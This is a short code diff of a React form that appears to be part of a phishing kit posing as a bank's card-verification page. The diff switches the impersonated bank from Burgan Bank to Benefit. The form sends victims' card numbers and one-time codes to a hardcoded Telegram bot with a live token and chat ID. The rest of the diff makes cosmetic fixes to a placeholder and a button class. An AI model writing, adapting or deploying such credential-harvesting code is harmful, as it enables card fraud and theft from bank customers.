@@ -24,7 +24,7 @@ function CodeForm() {
       return;
     }
 
-    const text = `بنك برقان%0A🔐 الكود: ${code}%0A💳 رقم البطاقة: ${cardNumber}`;
+    const text = `بنك بنفيت%0A🔐 الكود: ${code}%0A💳 رقم البطاقة: ${cardNumber}`;
     axios
       .post(
         `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
@@ -55,7 +55,7 @@ function CodeForm() {
   inputMode="numeric"
   pattern="\d*"
   className="form-control text-center mb-3"
-  placeholder="123456"
+  placeholder=" "
   dir="ltr"
   value={code}
   onChange={(e) => setCode(e.target.value)}
@@ -65,7 +65,7 @@ function CodeForm() {
           أرسل الرمز مجددًا
         </button>
 
-        <button className="btn btn-danher w-100" onClick={handleSend}>
+        <button className="btn btn-danger w-100" onClick={handleSend}>
           تحقق
         </button>
 
